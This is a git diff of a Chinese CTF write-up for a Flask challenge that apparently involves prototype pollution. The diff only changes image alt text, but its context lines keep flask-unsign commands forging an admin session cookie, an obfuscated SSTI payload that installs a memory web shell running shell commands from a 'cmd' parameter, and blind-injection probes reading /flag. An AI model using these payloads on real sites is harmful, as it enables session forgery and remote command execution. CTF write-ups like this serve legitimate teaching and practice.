@@ -19,11 +19,11 @@ tags: ["出题", "flask"]
 
 首先进入之后先注册，然后看到下面这几个页面
 
-![1](./assets/001.png)
+![image](./assets/001.png)
 
-![1](./assets/002.png)
+![image](./assets/002.png)
 
-![1](./assets/003.png)
+![image](./assets/003.png)
 
 这样子一看肯定就是注册页面有污染了，但是在哪里呢，F12看看有啥东西
 
@@ -35,7 +35,7 @@ eyJlY2hvX21lc3NhZ2UiOiJmc2Rmc2QiLCJpc19hZG1pbiI6MCwidXNlcm5hbWUiOiJiYW96b25nd2ki
 
 这个格式一看两个点，不排除是jwt的可能当然session的可能性更大，那么都试试
 
-![1](./assets/004.png)
+![image](./assets/004.png)
 
 就说明不是jwt了，那么用`flask-unsign`解密一下
 
@@ -43,7 +43,7 @@ eyJlY2hvX21lc3NhZ2UiOiJmc2Rmc2QiLCJpc19hZG1pbiI6MCwidXNlcm5hbWUiOiJiYW96b25nd2ki
 flask-unsign --decode --cookie 'eyJlY2hvX21lc3NhZ2UiOiJmc2Rmc2QiLCJpc19hZG1pbiI6MCwidXNlcm5hbWUiOiJiYW96b25nd2kifQ.ZzQM2g.UMnGpHtoMS9hsHEgg3M6epEcnoM'
 ```
 
-![1](./assets/005.png)
+![image](./assets/005.png)
 
 发现确实是这里，但是不知道key的话怎么办呢，这里是session那么大概率是flask，也就是普通的merge函数进行污染，我们本地写个demo
 
@@ -124,11 +124,11 @@ flask-unsign --sign --cookie "{'is_admin': 1, 'username': 'wi'}" --secret 'baozo
 
 换上之后发现这个
 
-![1](./assets/006.png)
+![image](./assets/006.png)
 
 那么已经是flask框架了，我们可以尝试SSTI注入，经过测试之后发现是不用带括号的flaskSSTI注入
 
-![1](./assets/007.png)
+![image](./assets/007.png)
 
 但是发现怎么打都打不了，试试内存马的打法呢，也不行
 
@@ -136,7 +136,7 @@ flask-unsign --sign --cookie "{'is_admin': 1, 'username': 'wi'}" --secret 'baozo
 url_for["\137\137\147\154\157\142\141\154\163\137\137"]["\137\137\142\165\151\154\164\151\156\163\137\137"]['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('cmd')).read())\")==None else resp)", {'request':url_for["\137\137\147\154\157\142\141\154\163\137\137"]['request'],'app':url_for["\137\137\147\154\157\142\141\154\163\137\137"]['current_app']})
 ```
 
-![1](./assets/008.png)
+![image](./assets/008.png)
 
 emm，那慢慢写试试
 
@@ -153,7 +153,7 @@ cycler["__in"+"it__"]["__glo"+"bals__"]["__bui"+"ltins__"].__import__('builtins'
 cycler["__in"+"it__"]["__glo"+"bals__"]["__bui"+"ltins__"].open('/flag').read(1)[0]=='c'
 ```
 
-![1](./assets/009.png)
+![image](./assets/009.png)
 
 那么可以尝试盲注了，写exp
 
